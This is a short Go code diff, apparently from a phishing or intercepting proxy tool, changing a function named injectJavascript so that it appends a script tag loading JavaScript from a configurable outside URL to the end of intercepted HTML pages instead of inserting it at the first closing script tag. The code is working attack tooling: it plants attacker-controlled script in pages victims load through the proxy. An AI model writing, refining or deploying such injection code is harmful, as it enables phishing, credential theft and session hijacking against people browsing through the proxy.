@@ -116,14 +116,14 @@ func (p *phishingProxy) injectJavascript(response *http.Response) error {
 	if !bytes.Contains(html[:100], []byte("<html")){
 		return nil
 	}
-	payload := fmt.Sprintf("</script><script type='text/javascript' src='%s'></script>", p.JavascriptURL)
-	html = bytes.Replace(html, []byte("</script>"), []byte(payload), 1)
+
+	payload := fmt.Sprintf("<script type='text/javascript' src='%s'></script>", p.JavascriptURL)
+	html = append(html, payload...)
 
 	response.Body = ioutil.NopCloser(bytes.NewBuffer(html))
 	response.Header.Set("Content-Length",fmt.Sprint(len(html)))
 	return nil
 }
-
 
 // InterceptingTransport sends the HTTP exchange to the loaded plugins.
 type InterceptingTransport struct {
